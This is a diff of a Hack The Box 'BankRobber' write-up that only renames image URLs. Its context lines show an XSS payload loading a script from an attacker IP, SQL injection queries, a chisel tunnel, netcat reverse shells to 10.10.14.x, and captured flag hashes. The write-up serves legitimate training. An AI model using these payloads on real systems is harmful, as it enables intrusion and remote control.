@@ -4,7 +4,7 @@ published: true
 description: "Comprehensive offensive security assessment and penetration testing report for BankRobber (Hack The Box). Methodological analysis covering initial access, local privilege escalation, and OffSec remediation."
 tags: cybersecurity, hackthebox, pentesting, infosec
 series: "HackTheBox Enterprise Assessments"
-cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_01.png"
+cover_image: "https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_01.png"
 ---
 
 # Offensive Security Assessment Report: BankRobber
@@ -76,12 +76,12 @@ cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/mai
 Enumeración
 
 
-![step_01.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_01.png)
+![step_01.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_01.png)
 * **Technical Finding (Phase 1):** Initial network reconnaissance and service detection exposing active daemons and communication endpoints.
 
 
 
-![step_02.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_02.png)
+![step_02.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_02.png)
 * **Technical Finding (Phase 2):** Attack surface enumeration, directory discovery, or parameter analysis identifying potential vulnerability vectors.
 
 
@@ -90,27 +90,27 @@ fromId=3&toId=2&amount=76&comment=%3Cimg%20src%3Dx%20onerror%3D%22new%20Image%28
 ```
 
 
-![step_03.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_03.png)
+![step_03.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_03.png)
 * **Assessment Step 03:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 
-![step_04.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_04.png)
+![step_04.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_04.png)
 * **Assessment Step 04:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 
-![step_05.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_05.png)
+![step_05.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_05.png)
 * **Assessment Step 05:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 
-![step_06.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_06.png)
+![step_06.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_06.png)
 * **Assessment Step 06:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 
-![step_07.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_07.png)
+![step_07.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_07.png)
 * **Assessment Step 07:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -119,7 +119,7 @@ fromId=3&toId=2&amount=76&comment=%3Cimg%20src%3Dx%20onerror%3D%22new%20Image%28
 ```
 
 
-![step_08.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_08.png)
+![step_08.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_08.png)
 * **Assessment Step 08:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -128,7 +128,7 @@ fromId=3&toId=2&amount=76&comment=%3Cimg%20src%3Dx%20onerror%3D%22new%20Image%28
 ```
 
 
-![step_09.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_09.png)
+![step_09.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_09.png)
 * **Assessment Step 09:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -140,7 +140,7 @@ FROM information_schema.tables
 ```
 
 
-![step_10.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_10.png)
+![step_10.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_10.png)
 * **Assessment Step 10:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -152,7 +152,7 @@ FROM information_schema.columns
 ```
 
 
-![step_11.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_11.png)
+![step_11.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_11.png)
 * **Assessment Step 11:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -164,7 +164,7 @@ FROM bankrobber.users-- -
 ```
 
 
-![step_12.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_12.png)
+![step_12.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_12.png)
 * **Assessment Step 12:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -173,7 +173,7 @@ FROM bankrobber.users-- -
 ```
 
 
-![step_13.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_13.png)
+![step_13.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_13.png)
 * **Assessment Step 13:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -182,7 +182,7 @@ FROM bankrobber.users-- -
 ```
 
 
-![step_14.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_14.png)
+![step_14.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_14.png)
 * **Assessment Step 14:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -191,12 +191,12 @@ FROM bankrobber.users-- -
 ```
 
 
-![step_15.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_15.png)
+![step_15.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_15.png)
 * **Assessment Step 15:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 
-![step_16.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_16.png)
+![step_16.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_16.png)
 * **Assessment Step 16:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -205,29 +205,29 @@ fromId=3&toId=4&amount=4&comment=<script+src%3dhttp%3a//10.10.14.8/script.js></s
 ```
 
 
-![step_17.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_17.png)
+![step_17.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_17.png)
 * **Assessment Step 17:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 
-![step_18.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_18.png)
+![step_18.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_18.png)
 * **Assessment Step 18:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 
-![step_19.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_19.png)
+![step_19.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_19.png)
 * **Assessment Step 19:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 
-![step_20.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_20.png)
+![step_20.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_20.png)
 * **Assessment Step 20:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 * **Observed Evidence / Output:** 4de6be1b35f65b8281ea5c7cf7075b2e
 
 
-![step_21.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_21.png)
+![step_21.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_21.png)
 * **Assessment Step 21:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -247,7 +247,7 @@ Escalada
 netstat -ano
 
 
-![step_22.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_22.png)
+![step_22.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_22.png)
 * **Assessment Step 22:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -260,7 +260,7 @@ chisel server —port 1234 reverse
 ```
 
 
-![step_23.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_23.png)
+![step_23.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_23.png)
 * **Assessment Step 23:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -269,7 +269,7 @@ C:\Users\Public\nc.exe 10.10.14.3 4444 -e cmd.exe
 ```
 
 
-![step_24.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_24.png)
+![step_24.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_24.png)
 * **Assessment Step 24:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -282,17 +282,17 @@ msf-pattern_offset -q 0Ab1
 ```
 
 
-![step_25.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_25.png)
+![step_25.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_25.png)
 * **Assessment Step 25:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 
-![step_26.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_26.png)
+![step_26.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_26.png)
 * **Assessment Step 26:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 
-![step_27.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_27.png)
+![step_27.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_27.png)
 * **Privilege Escalation PoC (Phase 4):** Exploitation of misconfiguration, SUID binary, or vulnerability leading to elevated privileges.
 
 
@@ -303,7 +303,7 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9AbC:\Users\Cortin\Desktop\nc64.exe -e cmd.exe 10.1
 09f3b8ad1aa0afbec27961f53f04f644
 
 
-![step_28.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bankrobber/images/step_28.png)
+![step_28.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/bankrobber/images/step_28.png)
 * **Evidence Verification (Phase 5):** Final administrative validation confirming root/SYSTEM access and retrieval of system flags.
 
 
